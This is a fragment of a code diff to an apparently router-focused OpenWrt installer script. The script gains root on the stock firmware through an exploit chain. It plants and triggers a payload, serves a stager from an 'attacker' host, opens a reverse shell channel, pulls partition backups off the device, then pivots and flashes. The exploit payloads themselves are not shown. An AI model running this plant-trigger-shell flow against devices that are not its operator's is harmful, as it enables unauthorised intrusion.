             images["initramfs_ubi"]["path"], images["initramfs_itb"]["path"])
@@ -1073,7 +1358,9 @@ def main(argv=None):
         args.openwrt_host = wait_and_discover(args.discover, fallback=fallback)
 
     if args.stage == "flash":
-        flash(args.openwrt_host, images, args.yes, profile, cfg_tar)
+        flash(args.openwrt_host, rel, images, args.yes, profile, args.images,
+              cfg_tar)
+        update_resume_phase(manifest_path, "flash-complete")
         return 0
 
     attacker = args.attacker or chain.local_ip(args.host)
@@ -1097,14 +1384,16 @@ def main(argv=None):
     else:
         stok, restore = None, []
 
-    http = channel.StagerServer(args.serve_port,
-                                channel.build_stager(attacker, args.serve_port,
-                                                     args.shell_port, restore))
-    ch = channel.ShellChannel(args.shell_port)
-    sink = channel.FileSink(args.file_port, outdir)
+    http = channel.StagerServer(
+        attacker, args.serve_port,
+        channel.build_stager(attacker, args.serve_port, args.shell_port,
+                             restore, token),
+        token, args.host)
+    ch = channel.ShellChannel(attacker, args.shell_port, token, args.host)
 
     if not args.skip_exploit:
-        chain.plant(args.host, stok, attacker, args.serve_port, restore)
+        chain.plant(args.host, stok, attacker, args.serve_port, restore,
+                    http.stager_path)
         for band, ssid, sec in channel.expected_wifi(restore):
             log(f"    after the trigger: {band} ssid={ssid!r} {sec}")
         chain.trigger(args.host, args.id.encode())
@@ -1124,26 +1413,39 @@ def main(argv=None):
     facts = preflight(ch, rel, images, args.yes, profile, args.images)
     with open(f"{outdir}/preflight.json", "w") as fh:
         json.dump(facts, fh, indent=2, default=str)
+    resume = update_resume_phase(manifest_path, "preflight-complete")
 
     if args.stage == "preflight":
         log("\n[+] pre-flight passed. Nothing was written.")
-        log("    re-run with --stage pivot to write the idle slot.")
+        command = ["python3", "install.py", args.image, "--stage", "pivot",
+                   "--skip-exploit", "--resume-manifest", manifest_path]
+        log("    " + shlex.join(command))
         return 0
 
-    backup(ch, sink, outdir, facts["mtd"], attacker, args.file_port, profile)
+    expected_files = {
+        f"{label}.bin": facts["mtd"][part]["size"]
+        for label, part in profile.backup_partitions
+    }
+    sink = channel.FileSink(attacker, args.file_port, outdir, token, args.host,
+                            expected_files)
+    backup(ch, sink, outdir, facts["mtd"], attacker, args.file_port, profile,
+           token)
     pivot(ch, http, facts, images, outdir, attacker, args.serve_port, args.yes,
-          profile, wifi)
+          profile, wifi, args.recover_stale_lock)
+    resume = update_resume_phase(manifest_path, "pivot-complete")
 
     if args.stage == "all":
         # The pivot has just rebooted the box into RAM; find it again there.
         fallback = profile.openwrt_host if args.transport == "wired" else None
         host = wait_and_discover(args.discover, fallback=fallback) \
             if args.discover else args.openwrt_host
-        flash(host, images, args.yes, profile, cfg_tar)
+        flash(host, rel, images, args.yes, profile, args.images, cfg_tar)
+        update_resume_phase(manifest_path, "flash-complete")
     else:
         log("\n[+] pivot done. When the RAM system is reachable, run:")
-        log(f"    python3 install.py --device {profile.slug} --stage flash "
-            f"--images {args.images}")
+        command = ["python3", "install.py", args.image, "--stage", "flash",
+                   "--resume-manifest", manifest_path]
+        log("    " + shlex.join(command))
     return 0
 
 
